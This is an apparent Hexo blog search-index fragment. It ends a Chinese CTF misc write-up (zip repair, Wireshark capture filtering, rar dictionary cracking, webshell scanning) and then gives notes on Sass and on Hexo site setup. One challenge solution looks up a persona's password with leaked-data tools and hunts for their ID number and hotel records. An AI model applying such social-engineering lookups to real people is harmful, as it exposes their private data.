                <img src="./41.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>修复后得到flag(不知道为什么会多一个0D,删掉就有flag了)<br><figure class="image-box">
                <img src="./42.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p>
<h2 id="寂静之城"><a href="#寂静之城" class="headerlink" title="寂静之城"></a>寂静之城</h2><p>信息收集吗?(我认真的看完了小说,还做了笔记,结果….不说了)<br>看下面的信息(真的是挨个看的,我真是服了)<br><figure class="image-box">
                <img src="./43.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>点进去,发现一串密文和他的邮箱<br><figure class="image-box">
                <img src="./44.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./45.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./46.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>查看回应的时候看到大家都在说日狗心里平衡多了,在结尾发现一个微博地址<br><figure class="image-box">
                <img src="./47.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>啥都没有,空空如也,老老实实整邮箱,用社工软件跑了一下,密码是 63542021127<br>再看这串密文像AES,试着解,加上偏移量,得到上面那个微博地址(感觉被耍了)<br><a href="http://weibo.com/u/3192503722" target="_blank" rel="noopener">http://weibo.com/u/3192503722</a><br>这回仔细日了他的微博,终于在相册发现了信息,但是只有一张路飞,试过隐写也啥都没有<br><figure class="image-box">
                <img src="./48.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>…..所以身份证号在哪?<br>迫不得已去搜了wp,行吧,图没有,开房记录也找不到,flag倒是有<br>flag{31010419920831481363542021127}</p>
<h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p>拖进wireshark,过滤http,在一个post流里找到了关键信息<br><figure class="image-box">
                <img src="./49.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>也许是账号密码,hint提示是32位小写MD5,试过单独md5提交,最后是拼接md5提交成功<br>flag{1d240aafe21a86afc11f38a45b541a49}</p>
<h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><figure class="image-box">
                <img src="./50.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag.txt 是个base64<br>解密得  flag{70354300a5100ba78068805661b93a5c}<br>直接丢进D盾去扫<br><figure class="image-box">
                <img src="./51.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>挨个查看,在大马那找到真正的密码<br><figure class="image-box">
                <img src="./52.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{ba8e6c6f35a53933b871480bb9a9545c}</p>
<h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>改rar后缀,字典爆破<br><figure class="image-box">
                <img src="./53.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{75a3d68bf071ee188c418ea6cf0bb043}</p>
<h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>是个上传图片的包,过滤http,找到图片包<br><figure class="image-box">
                <img src="./54.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{da73d88936010da1eeeb36e945ec4b97}</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Sass笔记]]></title>
      <url>/%E7%AC%94%E8%AE%B0/ckwd5ws8f003cd0uc8rhep7ax/</url>
      <content type="html"><![CDATA[<h2 id="Sass-css框架"><a href="#Sass-css框架" class="headerlink" title="Sass  css框架"></a>Sass  css框架</h2><p><a href="https://www.sass.hk/" target="_blank" rel="noopener">Sass官网</a></p>
<a id="more"></a>
<hr>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul>
<li>安装Ruby</li>
</ul>
<p><a href="http://rubyinstaller.org/downloads" target="_blank" rel="noopener">ruby</a><br>测试<br>ruby -v<br>//如安装成功会打印<br>ruby 2.2.2p95 (2015-04-13 revision 50295) [i386-mingw32]</p>
<ul>
<li>更换国内淘宝源</li>
</ul>
<p>// 1.删除原gem源<br>gem sources –remove <a href="https://rubygems.org/" target="_blank" rel="noopener">https://rubygems.org/</a></p>
<p>// 2.添加国内淘宝源<br>gem sources -a <a href="https://ruby.taobao.org/" target="_blank" rel="noopener">https://ruby.taobao.org/</a></p>
<p>// 3.打印是否替换成功<br>gem sources -l</p>
<p>// 4.更换成功后打印如下<br><strong><em> CURRENT SOURCES </em></strong><br><a href="https://ruby.taobao.org/" target="_blank" rel="noopener">https://ruby.taobao.org/</a></p>
<ul>
<li>安装Sass和Compass</li>
</ul>
<p>// 安装如下(如mac安装遇到权限问题需加 sudo gem install sass)<br>gem install sass<br>gem install compass</p>
<ul>
<li>常用命令</li>
</ul>
<p>// 更新sass<br>gem update sass</p>
<p>// 查看sass版本<br>sass -v</p>
<p>// 查看sass帮助<br>sass -h</p>
<ul>
<li>编译</li>
</ul>
<ol>
<li><p>sass编译有很多种方式，如命令行编译模式、sublime插件SASS-Build、编译软件koala、前端自动化软件codekit、Grunt打造前端自动化工作流grunt-sass、Gulp打造前端自动化工作流gulp-ruby-sass等。</p>
</li>
<li><p>命令行编译</p>
</li>
</ol>
<p>//单文件转换命令<br>sass input.scss output.css</p>
<p>//单文件监听命令<br>sass –watch input.scss:output.css</p>
<p>//如果有很多的sass文件的目录，可以告诉sass监听整个目录：<br>sass –watch app/sass:public/stylesheets</p>
<ol start="3">
<li>命令行编译配置选项</li>
</ol>
<p>命令行编译sass有配置选项，如编译过后css排版、生成调试map、开启debug信息等，可通过使用命令sass -v查看详细。我们一般常用两种–style<code></code>–sourcemap。<br>//编译格式<br>sass –watch input.scss:output.css –style compact</p>
<p>//编译添加调试map<br>sass –watch input.scss:output.css –sourcemap</p>
<p>//选择编译格式并添加调试map<br>sass –watch input.scss:output.css –style expanded –sourcemap</p>
<p>//开启debug信息<br>sass –watch input.scss:output.css –debug-info</p>
<p>–style表示解析后的css是什么排版格式;<br>sass内置有四种编译格式:nested<code>expanded</code>compact<code></code>compressed。<br>–sourcemap表示开启sourcemap调试。开启sourcemap调试后，会生成一个后缀名为.css.map文件。</p>
<ul>
<li>编译工具推荐</li>
</ul>
<p>koala是一个国产免费前端预处理器语言图形编译工具，支持Less、Sass、Compass、CoffeeScript，帮助web开发者更高效地使用它们进行开发。跨平台运行，完美兼容windows、linux、mac。</p>
<hr>
<h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><ul>
<li><p>$变量: 属性;</p>
</li>
<li><p>引用<br>规则块外  任意标签都可引用<br>规则块内  规则块可以引用，规则块外引用不影响<br>（类似于全局变量和局部变量的关系）</p>
</li>
<li><p>变量名支持_和-分隔</p>
</li>
</ul>
<hr>
<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><ul>
<li><p>嵌套CSS规则</p>
</li>
<li><p>父选择器标识符&amp;</p>
</li>
<li><p>群组选择器的嵌套</p>
</li>
<li><p>子组合选择器和同层组合选择器</p>
</li>
</ul>
<ol>
<li>“&gt;”：只会选择父元素下紧跟着的子元素中命中选择器的元素</li>
<li>“+”：选择父元素后紧跟的子元素</li>
<li>“~”：选择所有跟在父元素后同层的子元素</li>
</ol>
<ul>
<li><p>嵌套属性</p>
</li>
<li><p>导入Sass文件<br>@import规则：允许在一个css文件中导入其他css文件<br>使用（可省略后缀）：@import “文件名”;</p>
</li>
<li><p>使用Sass部分文件</p>
</li>
<li><p>默认变量值<br>!default 标签，用于变量，含义是：如果这个变量被声明赋值了，那就用它声明的值，否则就用这个默认值。</p>
</li>
<li><p>嵌套导入</p>
</li>
<li><p>原生css导入</p>
</li>
</ul>
<hr>
<p>三种情况下生成原生css</p>
<ol>
<li>被导入文件的名字以.css结尾；</li>
<li>被导入文件的名字是一个URL地址（比如<a href="http://www.sass.hk/css/css.css），由此可用谷歌字体API提供的相应服务；" target="_blank" rel="noopener">http://www.sass.hk/css/css.css），由此可用谷歌字体API提供的相应服务；</a></li>
<li>被导入文件的名字是CSS的url()值。</li>
</ol>
<hr>
<ul>
<li><p>静默注释<br>//  注释语法，注释内容不会出现在编译后的css文件中</p>
</li>
<li><p>混合器<br>@mixin  标识符定义<br>@include  标识符使用</p>
</li>
<li><p>给混合器传参<br>$name: value 的形式指定每个参数的值</p>
</li>
<li><p>默认参数值<br>$name: default-value 的声明形式 </p>
</li>
<li><p>选择器继承<br>@extend 语法</p>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Sass </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexo建站笔记]]></title>
      <url>/%E7%AC%94%E8%AE%B0/ckwd5ws7y002ld0ucfagpp5rx/</url>
      <content type="html"><![CDATA[<h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。<br><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo官方文档</a></p>
<a id="more"></a>
<hr>
<h3 id="安装Hexo-cli"><a href="#安装Hexo-cli" class="headerlink" title="安装Hexo-cli"></a>安装Hexo-cli</h3><p>需安装Node.js和Git<br>使用npm执行命令</p>
<blockquote>
<p>npm install -g hexo-cli<br>    hexo init <folder><br>    cd <folder><br>    npm install</folder></folder></p>
<ul>
<li>文件夹目录：<br>├── _config.yml（网站的配置信息）<br>├── package.json（应用程序信息，EJS, Stylus 和 Markdown renderer 已默认安装）<br>├── scaffolds（模板文件夹，Hexo的模板是指在新建的markdown文件中默认填充的内容）<br>├── source（资源文件夹，除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略）<br>|   ├── _drafts<br>|   └── _posts<br>|   └── public（Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去）<br>└── themes（主题文件夹，Hexo 会根据主题来生成静态页面）</li>
</ul>
</blockquote>
<hr>
<h3 id="配置SSH-key到github上"><a href="#配置SSH-key到github上" class="headerlink" title="配置SSH key到github上"></a>配置SSH key到github上</h3><ul>
<li>查看本机公钥<br>ssh<br>ssh-keygen -t rsa  回车三次生成ssh key<br>id_rsa.pub  公钥   id_rsa  私钥<br>cd ~/.ssh<br>cat id_rsa.pub </li>
<li>绑定github<br>setting<br>SSH and GPG keys<br>New SSH Key<br>添加公钥<br>测试  ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a></li>
<li>配置信息<br>需要配置：<br>git config –global user.name “”<br>// github用户名，非昵称<br>git config –global user.email  “”<br>// 填写github注册邮箱</li>
</ul>
<hr>
<h3 id="配置-config-yml"><a href="#配置-config-yml" class="headerlink" title="配置_config.yml"></a>配置_config.yml</h3><p><a href="https://blog.csdn.net/kingice1014/article/details/52924523" target="_blank" rel="noopener">详细</a></p>
<ul>
<li>网站</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">title</td>
<td style="text-align:center">网站标题</td>
</tr>
<tr>
<td style="text-align:center">subtitle</td>
<td style="text-align:center">网站副标题</td>
</tr>
<tr>
<td style="text-align:center">description</td>
<td style="text-align:center">网站描述</td>
</tr>
<tr>
<td style="text-align:center">author</td>
<td style="text-align:center">作者名字</td>
</tr>
<tr>
<td style="text-align:center">language</td>
<td style="text-align:center">网站使用语言<a href="https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes" target="_blank" rel="noopener">语言表</a></td>
</tr>
<tr>
<td style="text-align:center">timezone</td>
<td style="text-align:center">网站时区<a href="https://en.wikipedia.org/wiki/List_of_tz_database_time_zones" target="_blank" rel="noopener">时区列表</a></td>
</tr>
</tbody>
</table>
<ul>
<li>网址</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:center">描述</th>
<th style="text-align:center">默认值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">url</td>
<td style="text-align:center">网址</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">root</td>
<td style="text-align:center">网站根目录</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">permalink</td>
<td style="text-align:center">文章的永久连接格式</td>
<td style="text-align:center">:year/:month/:day/:title/</td>
</tr>
<tr>
<td style="text-align:center">permalink_defaults</td>
<td style="text-align:center">永久连接中各部分的默认值</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<ul>
<li>目录</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:center">描述</th>
<th style="text-align:left">默认值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">source_dir</td>
<td style="text-align:center">资源文件夹，这个文件夹用来存放内容。</td>
<td style="text-align:left">source</td>
</tr>
<tr>
<td style="text-align:center">public_dir</td>
<td style="text-align:center">公共文件夹，这个文件夹用于存放生成的站点文件。</td>
<td style="text-align:left">public</td>
</tr>
<tr>
<td style="text-align:center">tag_dir</td>
<td style="text-align:center">标签文件夹</td>
<td style="text-align:left">tags</td>
</tr>
<tr>
<td style="text-align:center">archive_dir</td>
<td style="text-align:center">归档文件夹</td>
<td style="text-align:left">archives</td>
</tr>
<tr>
<td style="text-align:center">category_dir</td>
<td style="text-align:center">分类文件夹</td>
<td style="text-align:left">categories</td>
</tr>
<tr>
<td style="text-align:center">code_dir</td>
<td style="text-align:center">Include code 文件夹</td>
<td style="text-align:left">downloads/code</td>
</tr>
<tr>
<td style="text-align:center">i18n_dir</td>
<td style="text-align:center">国际化（i18n）文件夹</td>
<td style="text-align:left">:lang</td>
</tr>
<tr>
<td style="text-align:center">skip_render</td>
<td style="text-align:center">跳过指定文件的渲染，您可使用 glob 表达式来匹配路径。</td>
</tr>
</tbody>
</table>
<p><a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">更多</a></p>
<hr>
<h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><p>常见命令</p>
<p>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #部署到GitHub<br>hexo help  # 查看帮助<br>hexo version  #查看Hexo的版本</p>
<p>缩写：</p>
<p>hexo n == hexo new<br>hexo g == hexo generate<br>hexo s == hexo server<br>hexo d == hexo deploy</p>
<p>组合命令：</p>
<p>hexo s -g #生成并本地预览<br>hexo d -g #生成并上传</p>
<hr>
<h3 id="发帖之类的使用操作"><a href="#发帖之类的使用操作" class="headerlink" title="发帖之类的使用操作"></a>发帖之类的使用操作</h3><p><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">看这个就会了</a><br><a href="https://blog.csdn.net/zhengyong15984285623/article/details/82380735" target="_blank" rel="noopener">还有这个</a></p>
<ul>
<li>初始md格式<br>title: postName #文章页面上的显示名称，一般是中文<br>date: 2013-12-02 15:30:16 #文章生成时间，一般不改，当然也可以任意修改<br>categories: 默认分类 #分类<br>tags: [tag1,tag2,tag3] #文章标签，可空，多标签请用格式，注意:后面有个空格<br>description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面<br>“<!--more-->“ #可折叠内容</li>
</ul>
<hr>
<h3 id="md显示不全-解析域名"><a href="#md显示不全-解析域名" class="headerlink" title="md显示不全+解析域名"></a>md显示不全+解析域名</h3><ul>
<li>在_config.yml中添加<blockquote>
<p>skip_render: README.md</p>
</blockquote>
</li>
<li>CNAME文件<br>下载hexo-generator-cname的插件<blockquote>
<p>npm i hexo-generator-cname –save<br>hexo g &amp;&amp; hexo deploy</p>
</blockquote>
</li>
</ul>
<hr>
<h3 id="更改主题"><a href="#更改主题" class="headerlink" title="更改主题"></a>更改主题</h3><p>使用官方自带或者NexT主题<br><a href="https://github.com/iissnan/hexo-theme-next/blob/master/README.cn.mdhttp://nextjs.frontendx.cn/" target="_blank" rel="noopener">NexT</a><br><a href="https://www.jianshu.com/p/21c94eb7bcd1" target="_blank" rel="noopener">不懂的看这篇文章</a></p>
<hr>
<h3 id="第三方插件"><a href="#第三方插件" class="headerlink" title="第三方插件"></a>第三方插件</h3><ul>
<li>Hexo-admin<br>Hexo-admin插件允许我们直接在本地页面上修改文章内容。<blockquote>
<p>npm i hexo-admin –save</p>
</blockquote>
</li>
</ul>
<p>登录<a href="http://localhost:4000/admin即可看到我们所有的文章内容，并且在可视化界面中操作文章内容" target="_blank" rel="noopener">http://localhost:4000/admin即可看到我们所有的文章内容，并且在可视化界面中操作文章内容</a></p>
<ul>
<li>Hexo-douban<br>hexo-douban插件可以在博客中添加豆瓣电影、读书和游戏页面，关联我们自己的账号。<blockquote>
<p>npm install hexo-douban –save</p>
</blockquote>
</li>
</ul>
<p>在hexo根目录下的config.yml文件中添加如下内容<br>douban:<br>  user:<br>  builtin: false<br>  book:<br>    title: ‘This is my book title’<br>    quote: ‘This is my book quote’<br>  movie:<br>    title: ‘This is my movie title’<br>    quote: ‘This is my movie quote’<br>  game:<br>    title: ‘This is my game title’<br>    quote: ‘This is my game quote’<br>  timeout: 10000</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
